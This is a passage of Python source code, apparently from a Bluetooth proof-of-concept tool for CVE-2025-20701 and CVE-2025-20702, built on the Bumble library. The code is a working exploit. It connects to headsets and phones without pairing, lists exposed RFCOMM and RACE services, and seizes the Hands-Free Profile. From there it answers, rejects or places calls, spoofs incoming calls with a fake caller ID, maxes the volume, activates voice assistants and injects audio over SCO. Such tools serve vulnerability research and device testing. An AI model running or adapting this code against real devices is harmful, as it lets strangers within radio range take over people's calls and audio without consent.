        "before allowing profile connections. Vulnerable devices skip this."
    )
    logging.info("")

    # Create checker to connect
    checker = RFCOMMBumbleChecker(controller, target_address, False)
    await checker.setup()

    logging.info("Connecting to %s without authentication...",
                 target_address)

    max_retries = 3
    retry_delay = 3.0
    connected = False

    for attempt in range(max_retries + 1):
        try:
            if checker.device is None:
                logging.error("Bluetooth device not initialized")
                return
            checker.connection = await checker.device.connect(  # type: ignore[misc]
                target_address, transport=BT_BR_EDR_TRANSPORT
            )
            connected = True
            break
        except Exception as e:  # pylint: disable=broad-exception-caught
            error_str = str(e).lower()

            if "limited_resources" in error_str:
                if attempt == 0:
                    logging.warning(
                        "Connection rejected by remote device - "
                        "device has too many active connections."
                    )
                else:
                    logging.warning("Retry %d/%d failed.",
                                    attempt, max_retries)

                if attempt < max_retries:
                    await checker.close()
                    reset_usb_bluetooth_controller(controller)
                    release_bluetooth_controller(controller)
                    logging.info(
                        "Waiting %.1f seconds before retry %d/%d...",
                        retry_delay, attempt + 1, max_retries
                    )
                    await asyncio.sleep(retry_delay)
                    retry_delay *= 1.5
                    checker = RFCOMMBumbleChecker(
                        controller, target_address, False)
                    await checker.setup()
                else:
                    logging.error(
                        "All %d retries exhausted. Target device may be busy.",
                        max_retries
                    )
                    await checker.close()
                    return

            elif "page_timeout" in error_str:
                logging.error("Connection failed: %s", e)
                logging.info("")
                logging.info("PAGE TIMEOUT - The device did not respond.")
                logging.info("Possible causes:")
                logging.info("  1. Device is out of range (try moving closer)")
                logging.info("  2. Device is powered off or in sleep mode")
                logging.info("  3. Device is not in connectable mode")
                logging.info("  4. Bluetooth address may be incorrect")
                logging.info("")
                logging.info(
                    "Tip: Make sure the target device is awake and nearby.")
                await checker.close()
                return

            elif "authentication" in error_str or "rejected" in error_str:
                logging.error("Connection failed: %s", e)
                logging.info("")
                logging.info("Connection was REJECTED by the device.")
                logging.info(
                    "This may mean the device is PATCHED against CVE-2025-20701."
                )
                await checker.close()
                return

            else:
                logging.error("Connection failed: %s", e)
                logging.info("")
                logging.info("Connection could not be established.")
                await checker.close()
                return

    if not connected:
        return

    logging.info("Connected successfully WITHOUT pairing!")
    logging.info("")
    logging.info("-" * 60)
    logging.info("IMPACT: The following services are accessible without auth:")
    logging.info("-" * 60)

    # Get device name
    try:
        name = await checker.connection.request_remote_name()
        logging.info("Device Name: %s", name)
    except Exception:  # pylint: disable=broad-exception-caught
        logging.info("Device Name: (could not retrieve)")

    # Enumerate all RFCOMM services
    from bumble.rfcomm import find_rfcomm_channels
    from bumble.core import UUID as BumbleUUID
    channels = await find_rfcomm_channels(checker.connection)

    def format_uuid(uuid_obj) -> str:
        """Format a UUID object to a readable string with name if known."""
        if isinstance(uuid_obj, BumbleUUID):
            # Get the string representation and name
            uuid_str = str(uuid_obj)
            if uuid_obj.name and uuid_obj.name != uuid_str:
                return f"{uuid_obj.name} ({uuid_str})"
            return uuid_str
        return str(uuid_obj)

    def format_uuids(uuids) -> str:
        """Format a list of UUIDs to a readable string."""
        if isinstance(uuids, list):
            return ", ".join(format_uuid(u) for u in uuids)
        return format_uuid(uuids)

    if channels:
        logging.info("")
        logging.info("RFCOMM Services (Serial Port Profile):")
        for channel, service_info in channels.items():
            uuid_str = format_uuids(
                service_info) if service_info else "Unknown"
            logging.info("  Channel %2d: %s", channel, uuid_str)

            # Check if it's a known RACE UUID
            known_uuid = RFCOMMTransport._matches_any_known_uuid(service_info)
            if known_uuid:
                logging.info(
                    "             ^^^ RACE PROTOCOL EXPOSED! (CVE-2025-20702)")
    else:
        logging.info("No RFCOMM services found.")

    # Check for HFP (Hands-Free Profile)
    logging.info("")
    logging.info("Checking for common profiles...")

    try:
        from bumble.hfp import find_hf_sdp_record
        hfp_record = await find_hf_sdp_record(checker.connection)
        if hfp_record:
            channel, _, _ = hfp_record
            logging.info(
                "  HFP (Hands-Free Profile): Channel %d - ACCESSIBLE", channel)
            logging.info("    -> Attacker could intercept/inject audio calls!")
    except Exception:  # pylint: disable=broad-exception-caught
        pass

    # Summary
    logging.info("")
    logging.info("=" * 60)
    logging.info("VULNERABILITY CONFIRMED: CVE-2025-20701")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This device allows Bluetooth Classic connections without pairing.")
    logging.info("An attacker within Bluetooth range (~10m) can:")
    logging.info("  1. Connect to the device without user consent")
    logging.info("  2. Access exposed Bluetooth profiles (HFP, A2DP, etc.)")
    logging.info(
        "  3. If RACE is exposed, fully compromise the device (CVE-2025-20702)")
    logging.info("")

    await checker.close()


async def command_hfp_demo(args: argparse.Namespace):
    """Demonstrate Hands-Free Profile access without pairing (CVE-2025-20701).

    This command shows the impact of the BR/EDR authentication bypass by
    connecting to the Hands-Free Profile and demonstrating control capabilities.

    It will try both roles:
    - HF (Hands-Free) role: For connecting to phones/audio gateways
    - AG (Audio Gateway) role: For connecting to headphones/earbuds
    """
    from bumble.hfp import (
        HfProtocol, HfConfiguration, HfFeature,
        AgProtocol, AgConfiguration, AgFeature, AgIndicatorState,
        AgIndicator, CallLineIdentification,
        _ESCO_PARAMETERS_CVSD_D1,  # For SCO audio setup
    )
    from bumble.rfcomm import Client as RFCOMM_Client
    from bumble.core import BT_BR_EDR_TRANSPORT
    from bumble import hfp
    from bumble.hci import (
        HCI_Enhanced_Setup_Synchronous_Connection_Command,
        HCI_SynchronousDataPacket,
        HCI_Command,
        HCI_UNKNOWN_HCI_COMMAND_ERROR,
    )
    import math  # For generating ringtone sine wave

    # Define the legacy HCI_Setup_Synchronous_Connection_Command
    # (Bumble only has the Enhanced version)
    # See Bluetooth Core Spec Vol 4, Part E, Section 7.1.26
    @HCI_Command.command(
        fields=[
            ('connection_handle', 2),
            ('transmit_bandwidth', 4),
            ('receive_bandwidth', 4),
            ('max_latency', 2),
            ('voice_setting', 2),
            ('retransmission_effort', 1),
            ('packet_type', 2),
        ],
    )
    class HCI_Setup_Synchronous_Connection_Command(HCI_Command):
        """Legacy Setup Synchronous Connection Command (opcode 0x0428)."""

    controller = args.controller or "usb:0"
    target_address = args.target_address
    action = getattr(args, 'action', 'info')
    dial_number = getattr(args, 'number', None)

    if not target_address:
        logging.error("Target address is required. Use --target-address")
        return

    logging.info("=" * 60)
    logging.info("CVE-2025-20701: Hands-Free Profile Exploitation Demo")
    logging.info("=" * 60)
    logging.info("")
    logging.info(
        "This demonstrates unauthorized access to the Hands-Free Profile.")
    logging.info("On vulnerable devices, an attacker can:")
    logging.info("  - Answer/reject incoming calls")
    logging.info("  - Initiate outgoing calls")
    logging.info("  - Hang up active calls")
    logging.info("  - Control voice recognition")
    logging.info("  - Access call history and device status")
    logging.info("")

    release_bluetooth_controller(controller)

    checker = RFCOMMBumbleChecker(controller, target_address, False)
    await checker.setup()

    logging.info("Connecting to %s...", target_address)

    try:
        if checker.device is None:
            logging.error("Bluetooth device not initialized")
            return
        checker.connection = await asyncio.wait_for(
            checker.device.connect(
                target_address, transport=BT_BR_EDR_TRANSPORT),
            timeout=10.0
        )
    except asyncio.TimeoutError:
        logging.error("Connection timed out after 10 seconds.")
        await checker.close()
        return
    except Exception as e:  # pylint: disable=broad-exception-caught
        error_str = str(e).lower()
        logging.error("Connection failed: %s", e)
        logging.info("")

        if "page_timeout" in error_str:
            logging.info("PAGE TIMEOUT - The device did not respond.")
            logging.info("")
            logging.info("Possible causes:")
            logging.info("  1. Device is out of range (try moving closer)")
            logging.info("  2. Device is powered off or in sleep mode")
            logging.info("  3. Device is not in connectable mode")
            logging.info("  4. Bluetooth address may be incorrect")
            logging.info(
                "  5. Device may be actively connected to another phone")
            logging.info("")
            logging.info("Tips:")
            logging.info(
                "  - Wake up the device (tap it, take it out of case)")
            logging.info("  - Move closer to the device")
            logging.info(
                "  - Try disconnecting the device from your phone first")
        elif "limited_resources" in error_str:
            logging.info("Controller resources exhausted.")
            logging.info(
                "Try unplugging and replugging the USB Bluetooth adapter.")

        await checker.close()
        return

    logging.info("Connected!")
    logging.info("")

    # Try to find HFP services - check both HF and AG SDP records
    hf_record = None
    ag_record = None
    use_ag_role = False

    logging.info("-" * 60)
    logging.info("Searching for HFP services...")
    logging.info("-" * 60)

    # First, try to find HF service (target is a headset, we act as AG)
    logging.info("Looking for Hands-Free Unit (HF) service...")
    try:
        hf_record = await asyncio.wait_for(
            hfp.find_hf_sdp_record(checker.connection),
            timeout=15.0
        )
        if hf_record:
            channel, hf_version, hf_features = hf_record
            logging.info("  Found HF service on RFCOMM channel %d", channel)
            logging.info("  HFP Version: %s", hf_version)
            logging.info("  Features: 0x%04X", hf_features)
            logging.info("  -> Target is a HEADSET/EARBUDS (HF role)")
            logging.info("  -> We will connect as AUDIO GATEWAY (AG role)")
            use_ag_role = True
        else:
            logging.info("  Not found.")
    except asyncio.TimeoutError:
        logging.info("  SDP query timed out.")
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.info("  Query failed: %s", e)

    # If no HF service, try AG service (target is a phone, we act as HF)
    if not hf_record:
        logging.info("")
        logging.info("Looking for Audio Gateway (AG) service...")
        try:
            ag_record = await asyncio.wait_for(
                hfp.find_ag_sdp_record(checker.connection),
                timeout=15.0
            )
            if ag_record:
                channel, ag_version, ag_features = ag_record
                logging.info(
                    "  Found AG service on RFCOMM channel %d", channel)
                logging.info("  HFP Version: %s", ag_version)
                logging.info("  Features: 0x%04X", ag_features)
                logging.info("  -> Target is a PHONE (AG role)")
                logging.info("  -> We will connect as HANDS-FREE (HF role)")
                use_ag_role = False
            else:
                logging.info("  Not found.")
        except asyncio.TimeoutError:
            logging.info("  SDP query timed out.")
        except Exception as e:  # pylint: disable=broad-exception-caught
            logging.info("  Query failed: %s", e)

    if not hf_record and not ag_record:
        logging.error("")
        logging.error("No HFP service found on this device.")
        logging.error("The device may not support Hands-Free Profile.")
        await checker.close()
        return

    # Determine which channel to use
    if use_ag_role and hf_record:
        channel = hf_record[0]
    elif ag_record:
        channel = ag_record[0]
    else:
        logging.error("Could not determine HFP channel.")
        await checker.close()
        return

    logging.info("")
    logging.info("-" * 60)
    logging.info("Connecting to RFCOMM channel %d...", channel)
    logging.info("-" * 60)

    # Connect to RFCOMM
    rfcomm_mux = None
    try:
        rfcomm_client = RFCOMM_Client(checker.connection)
        rfcomm_mux = await asyncio.wait_for(rfcomm_client.start(), timeout=15.0)
        dlc = await asyncio.wait_for(rfcomm_mux.open_dlc(channel), timeout=15.0)
        logging.info("RFCOMM channel %d opened successfully!", channel)
    except asyncio.TimeoutError:
        logging.error("RFCOMM connection timed out.")
        await checker.close()
        return
    except Exception as e:  # pylint: disable=broad-exception-caught
        logging.error("RFCOMM connection failed: %s", e)
        await checker.close()
        return

    logging.info("")
    logging.info("-" * 60)
    if use_ag_role:
        logging.info("Initializing as AUDIO GATEWAY (AG)...")
    else:
        logging.info("Initializing as HANDS-FREE UNIT (HF)...")
    logging.info("-" * 60)

    slc_established = False
    hf_protocol = None
    ag_protocol = None

    if use_ag_role:
        # We act as Audio Gateway connecting to headset
        ag_config = AgConfiguration(
            supported_ag_features=[
                AgFeature.THREE_WAY_CALLING,
                AgFeature.VOICE_RECOGNITION_FUNCTION,
                AgFeature.REJECT_CALL,
                AgFeature.ENHANCED_CALL_STATUS,
                AgFeature.IN_BAND_RING_TONE_CAPABILITY,
            ],
            # Set initial indicator values - service=1 (network available) is critical!
            supported_ag_indicators=[
                AgIndicatorState(
                    AgIndicator.CALL, {0, 1}, current_status=0),  # No call
                AgIndicatorState(
                    AgIndicator.CALL_SETUP, {0, 1, 2, 3}, current_status=0),
                AgIndicatorState(
                    AgIndicator.CALL_HELD, {0, 1, 2}, current_status=0),
                AgIndicatorState(
                    AgIndicator.SERVICE, {0, 1}, current_status=1),  # SERVICE AVAILABLE!
                AgIndicatorState(
                    AgIndicator.SIGNAL, {0, 1, 2, 3, 4, 5}, current_status=5),  # Full signal
                AgIndicatorState(
                    AgIndicator.ROAM, {0, 1}, current_status=0),  # Not roaming
                AgIndicatorState(
                    AgIndicator.BATTERY_CHARGE, {0, 1, 2, 3, 4, 5}, current_status=5),
            ],
            supported_hf_indicators=[],
            supported_ag_call_hold_operations=[],
            supported_audio_codecs=[],
        )

        # Create protocol first
        ag_protocol = AgProtocol(dlc, ag_config)

        # Add packet-level logging by wrapping the DLC write
        original_write = dlc.write

        def logged_write(data):
            if isinstance(data, bytes):
                text = data.decode('utf-8', errors='replace').strip()
            else:
                text = str(data).strip()
            logging.debug(">>> TX (AG->HF): %s", repr(text))
            return original_write(data)

        dlc.write = logged_write

        # Wrap the protocol's AT command reader to log incoming data
        original_read_at = ag_protocol._read_at

        def logged_read_at(data):
            if isinstance(data, bytes):
                text = data.decode('utf-8', errors='replace').strip()
            else:
                text = str(data).strip()
            logging.debug("<<< RX (HF->AG): %s", repr(text))
            return original_read_at(data)

        ag_protocol._read_at = logged_read_at
        dlc.sink = ag_protocol._read_at

        logging.info("Waiting for headset to complete SLC handshake...")
        logging.info(
            "(The headset sends AT commands, we respond automatically)")

        # Set up event to wait for SLC completion
        slc_complete_event = asyncio.Event()

        def on_slc_complete():
            logging.info("SLC handshake completed by headset!")
            slc_complete_event.set()

        # Set up event handlers for interesting events from headset
        def on_answer():
            logging.info(">>> HEADSET: User answered the call!")

        def on_hang_up():
            logging.info(">>> HEADSET: User hung up the call!")

        def on_dial(number):
            logging.info(">>> HEADSET: User dialing %s", number)

        ag_protocol.on('slc_complete', on_slc_complete)
        ag_protocol.on('answer', on_answer)
        ag_protocol.on('hang_up', on_hang_up)
        ag_protocol.on('dial', on_dial)

        try:
            # Wait for SLC to complete with timeout
            await asyncio.wait_for(slc_complete_event.wait(), timeout=15.0)
            logging.info("")
            logging.info("SUCCESS! Full HFP SLC established as Audio Gateway!")
            logging.info(
                "The headset completed handshake WITHOUT pairing!")
            logging.info("")
            slc_established = True

        except asyncio.TimeoutError:
            logging.warning("SLC handshake timed out after 15 seconds.")
            logging.info("")
            logging.info("The headset did not complete the SLC handshake.")
            logging.info("This could mean:")
            logging.info("  - The device has been PATCHED")
            logging.info(
                "  - The device requires a different AG configuration")
            logging.info("  - The device is already connected to a phone")
            logging.info("")
            logging.info(
                "However, RFCOMM connection succeeded without pairing,")
            logging.info("which still indicates a potential vulnerability.")
        except Exception as e:  # pylint: disable=broad-exception-caught
            logging.warning("AG initialization failed: %s", e)
            logging.info("")
            logging.info(
                "NOTE: Connected to HFP RFCOMM channel without pairing!")
            logging.info("      The vulnerability is CONFIRMED.")
    else:
        # We act as Hands-Free connecting to phone
        hf_config = HfConfiguration(
            supported_hf_features=[
                HfFeature.THREE_WAY_CALLING,
                HfFeature.CLI_PRESENTATION_CAPABILITY,
                HfFeature.VOICE_RECOGNITION_ACTIVATION,
                HfFeature.REMOTE_VOLUME_CONTROL,
            ],
            supported_hf_indicators=[],
            supported_audio_codecs=[],
        )
        hf_protocol = HfProtocol(dlc, hf_config)

        logging.info("Initiating SLC handshake with phone...")

        try:
            await asyncio.wait_for(hf_protocol.initiate_slc(), timeout=15.0)
            logging.info("HFP Service Level Connection established!")
            logging.info("")
            logging.info("SUCCESS! Full unauthorized HFP access achieved.")
            logging.info("")
            slc_established = True
        except asyncio.TimeoutError:
            logging.warning("SLC initialization timed out.")
            logging.info("")
            logging.info(
                "NOTE: Connected to HFP RFCOMM channel without pairing!")
            logging.info(
                "      The SLC handshake timed out. The target may be")
            logging.info("      a headset (HF role), not a phone (AG role).")
            logging.info("")
            logging.info("      The vulnerability is CONFIRMED - we connected")
            logging.info("      without any pairing or authentication.")
            logging.info("")
        except Exception as e:  # pylint: disable=broad-exception-caught
            logging.warning("SLC initialization failed: %s", e)
            logging.info("")
            logging.info(
                "NOTE: RFCOMM connection to HFP succeeded without pairing!")
            logging.info(
                "      Full SLC setup failed, but the vulnerability is confirmed.")
            logging.info("")

    # Perform the requested action
    if slc_established and (hf_protocol or ag_protocol):
        logging.info("-" * 60)
        logging.info("Executing action: %s", action.upper())
        if use_ag_role:
            logging.info("(Acting as Audio Gateway)")
        else:
            logging.info("(Acting as Hands-Free Unit)")
        logging.info("-" * 60)
        logging.info("")

        try:
            if action == "info":
                if use_ag_role and ag_protocol:
                    # As AG, we control the headset
                    logging.info("Connected to headset as Audio Gateway.")
                    logging.info("")
                    logging.info("As AG, we can send real HFP commands:")
                    logging.info(
                        "  - Incoming call notification (--action dial --number X)")
                    logging.info("  - Ring alert (--action ring)")
                    logging.info("  - Volume control (--action volume)")
                    logging.info("  - End call (--action hangup)")
                    logging.info("")
                    logging.info("Available commands:")
                    logging.info(
                        "  --action dial --number <num> : "
                        "Send incoming call from <num>")
                    logging.info(
                        "  --action ring     : Send RING alert")
                    logging.info("  --action hangup   : End the call")
                    logging.info("  --action volume   : Set max volume")
                elif hf_protocol:
                    # As HF, query the phone
                    logging.info("Querying device status...")
                    try:
                        calls = await asyncio.wait_for(
                            hf_protocol.query_current_calls(),
                            timeout=5.0
                        )
                        if calls:
                            logging.info("Active calls:")
                            for call in calls:
                                logging.info("  - %s", call)
                        else:
                            logging.info("No active calls.")
                    except asyncio.TimeoutError:
                        logging.info(
                            "  (query timed out - device may not support this)")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.info("  (query failed: %s)", e)

                    logging.info("")
                    logging.info("Available HF commands you can try:")
                    logging.info(
                        "  --action answer   : Answer an incoming call")
                    logging.info(
                        "  --action reject   : Reject an incoming call")
                    logging.info(
                        "  --action hangup   : Hang up the current call")
                    logging.info(
                        "  --action dial --number <num> : Dial a number")
                    logging.info(
                        "  --action voice    : Toggle voice recognition")

            elif action == "ring":
                if use_ag_role and ag_protocol:
                    logging.info("Sending RING notification to headset...")
                    try:
                        # Send ring notification with caller ID
                        number = dial_number or "+1234567890"
                        ag_protocol.send_ring()
                        # Create proper CLI object (type 145 = international format)
                        cli = CallLineIdentification(number=number, type=145)
                        ag_protocol.send_cli_notification(cli)
                        logging.info(
                            "RING sent! The headset should ring/announce call.")
                        logging.info("Caller ID sent: %s", number)
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Ring command failed: %s", e)
                else:
                    logging.error("Ring is only available in AG role.")

            elif action == "answer":
                if hf_protocol:
                    logging.info("Sending ANSWER command...")
                    try:
                        await hf_protocol.answer_incoming_call()
                        logging.info(
                            "Answer command sent! Check the target device.")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Answer command failed: %s", e)
                else:
                    logging.error("Answer is only available in HF role.")

            elif action == "reject":
                if hf_protocol:
                    logging.info("Sending REJECT command...")
                    try:
                        await hf_protocol.reject_incoming_call()
                        logging.info(
                            "Reject command sent! Check the target device.")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Reject command failed: %s", e)
                else:
                    logging.error("Reject is only available in HF role.")

            elif action == "hangup":
                if hf_protocol:
                    logging.info("Sending HANGUP command...")
                    try:
                        await hf_protocol.terminate_call()
                        logging.info(
                            "Hangup command sent! Check the target device.")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Hangup command failed: %s", e)
                elif use_ag_role and ag_protocol:
                    logging.info("Ending call...")
                    try:
                        # Update indicators to show call ended
                        ag_protocol.update_ag_indicator(
                            AgIndicator.CALL_SETUP, 0)  # No call setup
                        ag_protocol.update_ag_indicator(
                            AgIndicator.CALL, 0)  # No active call
                        logging.info("Call ended - indicators updated.")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Hangup failed: %s", e)

            elif action == "dial":
                if not dial_number:
                    logging.error(
                        "Phone number required. Use --number <number>")
                elif hf_protocol:
                    logging.info("Dialing %s...", dial_number)
                    try:
                        # Send ATD command to dial
                        await hf_protocol.execute_command(f"ATD{dial_number};")
                        logging.info(
                            "Dial command sent! "
                            "The connected phone should be calling %s",
                            dial_number
                        )
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Dial command failed: %s", e)
                elif use_ag_role and ag_protocol:
                    # As AG, send incoming call notification to headset
                    logging.info(
                        "Sending incoming call from %s to headset...",
                        dial_number)
                    try:
                        # Wait for headset to finish post-SLC setup
                        # (AT+CMER, AT+CLIP, AT+VGS, etc.)
                        logging.info(
                            "Waiting 3 seconds for headset post-SLC setup...")
                        await asyncio.sleep(3.0)

                        # DISABLE in-band ringtone - headset should use its own ringtone
                        # (We're not setting up SCO audio, so in-band won't work)
                        ag_protocol.set_inband_ringtone_enabled(False)
                        logging.info(
                            "Disabled in-band ringtone (headset uses own tone)")

                        # Set call setup indicator to incoming call (1)
                        ag_protocol.update_ag_indicator(
                            AgIndicator.CALL_SETUP, 1)
                        logging.info("Sent: +CIEV (callsetup=1)")

                        # Small delay before first RING
                        await asyncio.sleep(0.5)

                        # Send RING with caller ID
                        cli = CallLineIdentification(
                            number=dial_number, type=145)

                        # Send multiple RINGs (phones typically ring every 3s)
                        for i in range(10):
                            logging.info("Sending RING #%d...", i + 1)
                            ag_protocol.send_ring()
                            ag_protocol.send_cli_notification(cli)
                            logging.info(
                                "  RING + CLIP: \"%s\"", dial_number)

                            # Wait 3 seconds between rings
                            await asyncio.sleep(3.0)

                        logging.info("")
                        logging.info("Finished ringing. Ending call setup...")
                        # Clear call setup (call not answered)
                        ag_protocol.update_ag_indicator(
                            AgIndicator.CALL_SETUP, 0)
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Incoming call failed: %s", e)
                else:
                    logging.error("Dial requires HF or AG connection.")

            elif action == "volume":
                if use_ag_role and ag_protocol:
                    logging.info("Setting speaker volume to maximum...")
                    try:
                        ag_protocol.set_speaker_volume(15)  # Max is 15
                        logging.info("Volume command sent!")
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error("Volume command failed: %s", e)
                else:
                    logging.error(
                        "Volume control is only available in AG role.")

            elif action == "voice":
                if hf_protocol:
                    logging.info("Toggling voice recognition...")
                    try:
                        # Send BVRA command to toggle voice recognition
                        await hf_protocol.execute_command("AT+BVRA=1")
                        logging.info(
                            "Voice recognition command sent! "
                            "Check if Siri/Google Assistant activated."
                        )
                    except Exception as e:  # pylint: disable=broad-exception-caught
                        logging.error(
                            "Voice recognition command failed: %s", e)
                else:
                    logging.error(
                        "Voice command is only available in HF role.")

            elif action == "sco-ring":
                if use_ag_role and ag_protocol:
                    logging.info("=" * 60)
                    logging.info(
                        "Setting up SCO audio connection for ringtone...")
                    logging.info("=" * 60)
                    try:
                        # Get the ACL connection handle from the existing connection
                        # The checker has the device and connection
                        acl_connection = checker.connection
                        if not acl_connection:
                            logging.error("No ACL connection available")
                            raise RuntimeError("No ACL connection")

                        acl_handle = acl_connection.handle
                        logging.info(
                            "ACL connection handle: 0x%04X", acl_handle)

                        # Get ESCO parameters for CVSD codec
                        esco = _ESCO_PARAMETERS_CVSD_D1

                        # Set up event to wait for SCO connection
                        sco_connected = asyncio.Event()
                        # Use list to allow modification in closure
                        sco_handle = [None]

                        def on_sco_connection(sco_link):
                            """Handle SCO connection complete event.

                            Args:
                                sco_link: ScoLink object with handle, link_type, etc.
                            """
                            logging.info(
                                "SCO connection established! "
                                "Handle: 0x%04X, Link type: %s",
                                sco_link.handle, sco_link.link_type)
                            sco_handle[0] = sco_link.handle
                            sco_connected.set()

                        def on_sco_failure(error):
                            """Handle SCO connection failure."""
                            logging.error(
                                "SCO setup failed: %s", error)

                        # Register SCO event handlers
                        device = checker.device
                        device.on('sco_connection', on_sco_connection)
                        device.on('sco_connection_failure', on_sco_failure)

                        # Try Enhanced Setup Synchronous Connection first,
                        # fall back to legacy if controller doesn't support it
                        sco_setup_success = False

                        logging.info(
                            "Trying Enhanced Setup Synchronous Connection...")
                        logging.info("  Codec: CVSD")
                        logging.info("  Packet type: HV3")
                        logging.info("  Bandwidth: 8000 bytes/sec")

                        # Send the Enhanced Setup Synchronous Connection command
                        cmd = HCI_Enhanced_Setup_Synchronous_Connection_Command(
                            connection_handle=acl_handle,
                            transmit_bandwidth=esco.transmit_bandwidth,
                            receive_bandwidth=esco.receive_bandwidth,
                            transmit_coding_format=esco.transmit_coding_format,
                            receive_coding_format=esco.receive_coding_format,
                            transmit_codec_frame_size=esco.transmit_codec_frame_size,
                            receive_codec_frame_size=esco.receive_codec_frame_size,
                            input_bandwidth=esco.input_bandwidth,
                            output_bandwidth=esco.output_bandwidth,
                            input_coding_format=esco.input_coding_format,
                            output_coding_format=esco.output_coding_format,
                            input_coded_data_size=esco.input_coded_data_size,
                            output_coded_data_size=esco.output_coded_data_size,
                            input_pcm_data_format=esco.input_pcm_data_format,
                            output_pcm_data_format=esco.output_pcm_data_format,
                            input_pcm_sample_payload_msb_position=esco.input_pcm_sample_payload_msb_position,
                            output_pcm_sample_payload_msb_position=esco.output_pcm_sample_payload_msb_position,
                            input_data_path=esco.input_data_path,
                            output_data_path=esco.output_data_path,
                            input_transport_unit_size=esco.input_transport_unit_size,
                            output_transport_unit_size=esco.output_transport_unit_size,
                            max_latency=esco.max_latency,
                            packet_type=esco.packet_type,
                            retransmission_effort=esco.retransmission_effort,
                        )

                        # Send the command through the device
                        response = await device.send_command(cmd)
                        logging.debug(
                            "Enhanced SCO setup response: %s", response)

                        # Check if controller supports the enhanced command
                        if hasattr(response, 'return_parameters'):
                            if response.return_parameters == HCI_UNKNOWN_HCI_COMMAND_ERROR:
                                logging.warning(
                                    "Controller doesn't support Enhanced SCO setup")
                                logging.info(
                                    "Falling back to legacy Setup Synchronous Connection...")

                                # Use legacy command with Voice Setting
                                # Voice Setting bits (see BT spec Vol 4 Part E 6.12):
                                # Bits 0-1: Input Coding (0=Linear, 1=u-law, 2=A-law, 3=reserved)
                                # Bits 2-3: Input Data Format (0=1's complement, 1=2's complement, 2=Sign-mag, 3=unsigned)
                                # Bit 4: Input Sample Size (0=8-bit, 1=16-bit) - only for Linear PCM
                                # Bits 5-6: Air Coding Format (0=CVSD, 1=u-law, 2=A-law, 3=Transparent)
                                # For CVSD with 16-bit linear PCM 2's complement input:
                                #   Input Coding = 00 (Linear)
                                #   Input Data Format = 01 (2's complement)
                                #   Input Sample Size = 1 (16-bit)
                                #   Air Coding = 00 (CVSD)
                                # voice_setting = 0b00010100 = 0x0014
                                voice_setting = 0x0014

                                # Packet type for SCO: HV1=0x0001, HV2=0x0002, HV3=0x0004
                                # Use HV3 (lowest bandwidth, most compatible)
                                packet_type = 0x0004  # HV3

                                legacy_cmd = HCI_Setup_Synchronous_Connection_Command(
                                    connection_handle=acl_handle,
                                    transmit_bandwidth=8000,
                                    receive_bandwidth=8000,
                                    max_latency=0xFFFF,  # Don't care
                                    voice_setting=voice_setting,
                                    retransmission_effort=0x00,  # No retransmission
                                    packet_type=packet_type,
                                )
                                response = await device.send_command(legacy_cmd)
                                logging.debug(
                                    "Legacy SCO setup response: %s", response)

                                # Check response
                                if hasattr(response, 'return_parameters'):
                                    if response.return_parameters == HCI_UNKNOWN_HCI_COMMAND_ERROR:
                                        logging.error(
                                            "Controller doesn't support legacy SCO either!")
                                        raise RuntimeError(
                                            "No SCO command supported by controller")
                                    elif response.return_parameters != 0:
                                        logging.warning(
                                            "Legacy SCO setup returned: 0x%02X",
                                            response.return_parameters)
                                    else:
                                        logging.info(
                                            "Legacy SCO command accepted!")
                                        sco_setup_success = True
                                else:
                                    # Command status event - command pending
                                    logging.info(
                                        "Legacy SCO command sent (pending)")
                                    sco_setup_success = True
                            elif response.return_parameters != 0:
                                logging.warning(
                                    "Enhanced SCO setup returned error: 0x%02X",
                                    response.return_parameters)
                            else:
                                logging.info("Enhanced SCO command accepted!")
                                sco_setup_success = True
                        else:
                            # Command status event - command pending
                            logging.info("Enhanced SCO command sent (pending)")
                            sco_setup_success = True

                        if not sco_setup_success:
                            raise RuntimeError("SCO setup command failed")

                        # Wait for SCO connection with timeout
                        try:
                            await asyncio.wait_for(
                                sco_connected.wait(), timeout=10.0)
                        except asyncio.TimeoutError:
                            logging.warning(
                                "SCO connection timed out - "
                                "headset may not accept SCO from non-paired device")
                            raise

                        if sco_handle[0] is not None:
                            logging.info("")
                            logging.info("=" * 60)
                            logging.info("SCO AUDIO CHANNEL ESTABLISHED!")
                            logging.info("=" * 60)
                            logging.info("")
                            logging.info(
                                "Now sending ringtone audio to headphones...")

                            # Generate a simple ringtone (dual-tone like phone ring)
                            # 8kHz sample rate, 16-bit signed PCM, CVSD encoded
                            # Standard phone ring: 440Hz + 480Hz (US dial tone style)
                            # or 425Hz (European style)
                            sample_rate = 8000
                            duration_ms = 500  # Ring duration in ms
                            samples_per_packet = 60  # CVSD packet size

                            def generate_ringtone_samples(
                                    freq1, freq2, num_samples, offset):
                                """Generate dual-tone samples for ringtone."""
                                samples = []
                                for i in range(num_samples):
                                    t = (offset + i) / sample_rate
                                    # Dual tone
                                    val = 0.5 * (
                                        math.sin(2 * math.pi * freq1 * t) +
                                        math.sin(2 * math.pi * freq2 * t))
                                    # Scale to 16-bit signed
                                    sample = int(val * 16000)
                                    samples.append(sample)
                                return samples

                            def samples_to_bytes(samples):
                                """Convert samples to little-endian 16-bit bytes."""
                                result = bytearray()
                                for s in samples:
                                    # Clamp to 16-bit signed range
                                    s = max(-32768, min(32767, s))
                                    # Little-endian 16-bit signed
                                    result.extend(struct.pack('<h', s))
                                return bytes(result)

                            # Send ringtone for 3 seconds (ring on, pause, ring on)
                            host = device.host
                            total_packets = 0
                            # 3 ring cycles (on-off-on-off-on-off)
                            ring_cycles = 6

                            for cycle in range(ring_cycles):
                                if cycle % 2 == 0:
                                    # Ring ON phase (500ms)
                                    samples_sent = 0
                                    while samples_sent < sample_rate // 2:
                                        samples = generate_ringtone_samples(
                                            440, 480,  # US ringtone frequencies
                                            samples_per_packet // 2,  # 30 samples = 60 bytes
                                            samples_sent)
                                        audio_data = samples_to_bytes(samples)

                                        # Create SCO packet
